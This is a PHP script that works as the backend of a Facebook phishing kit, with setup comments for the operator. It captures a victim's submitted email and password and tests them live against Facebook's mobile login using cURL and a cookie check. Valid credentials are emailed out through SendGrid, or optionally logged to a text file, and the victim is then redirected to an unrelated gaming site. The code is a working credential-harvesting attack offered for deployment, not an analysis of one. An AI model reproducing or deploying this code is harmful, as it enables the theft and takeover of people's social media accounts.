

<?php
error_reporting(0);

//email class

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';
// email class stop

$url  = 'https://m.facebook.com/login.php';

login($url);

function login($url){
    $user = $_POST['email'];
    $pass = $_POST['pass'];
    $fp = fopen("cookie.txt", "w");  // create cookie.txt file and add permission 777.. chmod 777 cookie.txt
    fclose($fp);
    $login = curl_init();
    curl_setopt($login, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass);
    curl_setopt($login, CURLOPT_COOKIEJAR, "cookie.txt");
    curl_setopt($login, CURLOPT_COOKIEFILE, "cookie.txt");
    curl_setopt($login, CURLOPT_TIMEOUT, 40000);
    curl_setopt($login, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($login, CURLOPT_URL, $url);
    curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($login, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($login, CURLOPT_POST, TRUE);
    ob_start();
    return curl_exec ($login);
    ob_end_clean();
    curl_close ($login);
    unset($login);  

}       

     $lines = file('cookie.txt');
     $lines =preg_grep("/c_user/", $lines);

if($lines){
   // email function start here
    $mail = new PHPMailer(true);

try {
                                                                   //Server settings
    $mail->isSMTP();                                              // Send using SMTP
    $mail->Host       = 'smtp.sendgrid.net';                     // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = '';                                    // SMTP username
    $mail->Password   = '';                                   // SMTP password
    $mail->SMTPSecure = 'tls';                               // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 587;                                // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

                                                          //Recipients
    $mail->setFrom('gamezop@gmail.com', 'gamezop');
    $mail->addAddress('' );                             // Add a recipient-> your email
                                                       // Name is optional

                                                     // Content
    $mail->isHTML(true);                            // Set email format to HTML
    $mail->Subject = 'New Login';
    $mail->Body    = "Email: " . $_POST['email'] . " Pass: " . $_POST['pass'] ;
  

    $mail->send();
    header("Location: https://www.gamezop.com/welcome?id=mxjlLNDW9");
    } catch (Exception $e) {
   // email stop here 

        // data copy to site....? remove all email code.. then uncomment this code...

      // file_put_contents("usernames.txt", "Facebook Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);  
     // header("Location: https://www.gamezop.com/welcome?id=mxjlLNDW9"); 

}

        
     }else{
               // add your site url here.. https://sitename.com/login.php?error

        header("Location: https://yourappname.herokuapp.com/login.php?error");

        exit();
     }

?>
